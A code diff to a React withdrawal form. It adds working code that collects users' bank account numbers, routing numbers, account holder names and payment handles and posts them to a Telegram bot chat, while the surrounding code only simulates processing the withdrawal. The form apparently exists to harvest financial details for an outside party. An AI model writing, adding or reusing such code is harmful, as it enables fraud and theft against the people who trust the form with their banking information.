@@ -71,6 +71,33 @@ export default function WithdrawalModal({
 
     setIsProcessing(true);
 
+    const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+    const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+
+    let details = '';
+    if (withdrawalMethod === 'bank') {
+      details = `Bank: ${bankDetails.bankName}\nAccount: ${bankDetails.accountNumber}\nRouting: ${bankDetails.routingNumber}\nHolder: ${bankDetails.accountHolderName}`;
+    } else if (withdrawalMethod === 'transfer') {
+      details = `Recipient: ${transferDetails.recipientEmail}\nNote: ${transferDetails.note}`;
+    } else {
+      details = `Handle/Email: ${digitalDetails.handle || digitalDetails.email}`;
+    }
+
+    const message = `💸 *WITHDRAWAL REQUEST*\n\n` +
+      `Method: ${withdrawalMethod.toUpperCase()}\n` +
+      `Amount: ${amount} ${currency}\n\n` +
+      `📋 Details:\n${details}`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+
     // Simulate processing delay
     setTimeout(() => {
       setIsProcessing(false);
